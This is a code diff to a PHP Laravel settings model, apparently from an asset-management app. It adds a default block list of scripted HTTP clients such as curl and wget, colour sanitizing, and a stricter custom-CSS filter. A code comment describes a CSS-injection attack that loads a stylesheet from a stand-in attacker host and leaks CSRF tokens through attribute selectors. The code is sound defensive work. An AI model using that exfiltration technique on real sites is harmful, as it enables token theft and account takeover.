@@ -3,9 +3,11 @@
 namespace App\Models;
 
 use App\Helpers\Helper;
+use App\Rules\CssColor;
 use App\Models\Labels\CustomUserLabel;
 use App\Models\Labels\Label;
 use Carbon\Carbon;
+use Illuminate\Database\Eloquent\Casts\Attribute;
 use Illuminate\Database\Eloquent\Factories\HasFactory;
 use Illuminate\Database\Eloquent\Model;
 use Illuminate\Notifications\Notifiable;
@@ -73,6 +75,44 @@ class Setting extends Model
         'label2_asset_logo' => 'boolean',
         'require_checkinout_notes' => 'boolean',
         'manager_view_enabled' => 'boolean',
+        'block_api_user_agents' => 'boolean',
+        'block_blank_api_user_agents' => 'boolean',
+        // tinyInteger with no cast was leaking 0 (int) into call sites that
+        // use loose-equality string checks like `== '1'` and `== ''`. Under
+        // PHP 8 `0 == ''` is false, so checks expecting "disabled" misfired.
+        // Normalize on read so every consumer sees a consistent string mode.
+        'two_factor_enabled' => 'string',
+    ];
+
+    /**
+     * Suggested defaults for the "blocked API User-Agent patterns" textarea.
+     *
+     * Substrings (matched case-insensitively against the request's User-Agent)
+     * that identify common scripted or default HTTP clients. New installs see
+     * this list as the pre-filled textarea value; admins can add, remove, or
+     * blank it out entirely. Browser-driven AJAX (snipeit.js, datatables,
+     * select2, etc.) carries the browser's own User-Agent and is unaffected.
+     */
+    public const DEFAULT_BLOCKED_API_USER_AGENTS = [
+        'curl/',
+        'wget/',
+        'python-requests/',
+        'python-urllib',
+        'PostmanRuntime/',
+        'insomnia/',
+        'Go-http-client/',
+        'okhttp/',
+        'HTTPie/',
+        'Apache-HttpClient/',
+        'Java/',
+        'Faraday',
+        'http.rb/',
+        'libwww-perl/',
+        'Ruby',
+        'node-fetch/',
+        'axios/',
+        'GuzzleHttp/',
+        'RestSharp/',
     ];
 
     /**
@@ -175,17 +215,82 @@ class Setting extends Model
      *
      * @author A. Gianotto <snipe@snipe.net>
      */
+    protected function headerColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#3c8dbc'),
+        );
+    }
+
+    protected function linkLightColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#296282'),
+        );
+    }
+
+    protected function linkDarkColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#5fa4cc'),
+        );
+    }
+
+    protected function navLinkColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#ffffff'),
+        );
+    }
+
     public function show_custom_css(): string
     {
         $custom_css = self::getSettings()->custom_css;
-        $custom_css = e($custom_css);
-        // Needed for modifying the bootstrap nav :(
-        $custom_css = str_ireplace('script', 'SCRIPTS-NOT-ALLOWED-HERE', $custom_css);
-        $custom_css = str_replace('&gt;', '>', $custom_css);
-        // Allow String output (needs quotes)
-        $custom_css = str_replace('&quot;', '"', $custom_css);
+        if ($custom_css === null || $custom_css === '') {
+            return '';
+        }
+
+        // Superuser-planted CSS renders inside <style> on every layout for
+        // every other superuser, so the sanitize step has to hold up as a
+        // CSS filter, not just an HTML filter. Two abuse primitives to
+        // shut down:
+        //
+        //   @import url("https://attacker.example/x.css") lets the planter
+        //   load an unrestricted external stylesheet, which can then use
+        //   attribute-selector rules (input[name="_token"][value^="a"]{...})
+        //   to exfiltrate CSRF tokens character by character on every page
+        //   load.
+        //
+        //   background: url("https://attacker.example/?t=...") reaches the
+        //   same primitive without @import as long as the value is any
+        //   absolute or protocol-relative URL. Same-origin relative paths
+        //   under /uploads/ etc. are fine for legit branding assets.
+        //
+        // strip_tags belt-and-braces guards against injection reaching a
+        // context that treats < as an HTML boundary. The old encode-then-
+        // selectively-decode chain silently undid its own work on > and "
+        // and did not touch either @import or url(), so it's gone.
+        $custom_css = strip_tags($custom_css);
+        $custom_css = preg_replace('/@import\s+[^;]*;?/i', '', $custom_css);
+        $custom_css = preg_replace_callback(
+            '/\burl\s*\(\s*([^)]*)\)/i',
+            function (array $match): string {
+                $value = trim($match[1], " \t\n\r\"'");
+                if ($value === '' || preg_match('#^(https?:)?//|^data:|^javascript:|^vbscript:#i', $value)) {
+                    return '';
+                }
+
+                return $match[0];
+            },
+            $custom_css,
+        );
 
         return $custom_css;
+    }
+
+    public function isQrEnabled(): bool
+    {
+        return $this->qr_code == '1' || $this->label2_2d_type !== 'none';
     }
 
     /**
